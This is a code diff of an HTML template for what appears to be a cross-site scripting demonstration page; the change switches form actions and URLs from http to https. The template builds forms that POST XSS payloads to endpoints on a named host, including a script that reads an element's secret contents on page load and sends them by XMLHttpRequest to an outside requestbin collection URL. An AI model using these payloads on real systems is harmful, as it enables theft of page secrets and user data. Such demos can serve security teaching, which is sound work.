@@ -9,7 +9,7 @@
     <a href="hidden">Go to a less evil looking page</a>
     {% for endpoint in endpoints %}
         <h2>{{endpoint}}</h2>
-        <form method="POST" action="http://bob-cloud-computing.tk/{{endpoint}}">
+        <form method="POST" action="https://bob-cloud-computing.tk/{{endpoint}}">
             <input type="text" style="width:100%" name="vulnerable" value="<script>function demo() {alert('XSS');} setTimeout(demo, 10)</script>"/>
             <input type="submit" value="Submit" />
         </form>
@@ -17,13 +17,13 @@
 
     {% for endpoint in extract %}
         <h2>Try a real extraction on {{endpoint}}</h2>
-        <form method="POST" action="http://bob-cloud-computing.tk/{{endpoint}}">
+        <form method="POST" action="https://bob-cloud-computing.tk/{{endpoint}}">
             <textarea style="width:100%; height: 5em" name="vulnerable">
 <script>
     window.onload = function(e){
         var element = document.getElementById("secret");
         var secret = element.innerHTML;
-        var url = "http://requestbin.etnarek.com/13nfvyr1?secret=" + secret;
+        var url = "https://requestbin.etnarek.com/13nfvyr1?secret=" + secret;
         var xmlHttp = new XMLHttpRequest();
         xmlHttp.open("GET", url, true);
         xmlHttp.send();
